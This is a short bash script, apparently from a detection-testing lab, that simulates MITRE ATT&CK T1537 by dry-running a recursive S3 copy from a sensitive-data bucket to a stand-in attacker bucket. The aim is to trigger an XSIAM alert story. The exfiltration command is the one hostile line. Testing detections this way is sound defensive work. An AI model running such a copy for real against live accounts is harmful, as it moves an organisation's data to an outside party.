#!/usr/bin/env bash
# T1537 — Transfer Data to Cloud Account
# Intent: simulate cross-account S3 copy; CDR + TIM + XSIAM final stitching target
# NOTE: --dryrun is used intentionally to avoid actual data movement in lab
set -u -o pipefail
SRC="${TARGET_BUCKET:-cortexsim-sensitive-demo}"
DEST="${ATTACKER_BUCKET:-cortexsim-attacker-drop}"
echo "[MP-004/T1537] simulated cross-account S3 copy: ${SRC} -> ${DEST}"
if ! command -v aws >/dev/null 2>&1; then
  echo "aws CLI not installed — skipping"; exit 0
fi
aws s3 cp "s3://${SRC}/" "s3://${DEST}/" --recursive --region us-east-1 --dryrun 2>&1 | head -10 || true
echo "[done] Expected: XSIAM stitched story — EDR cred-dump → CDR pivot → enum → collection → exfil"
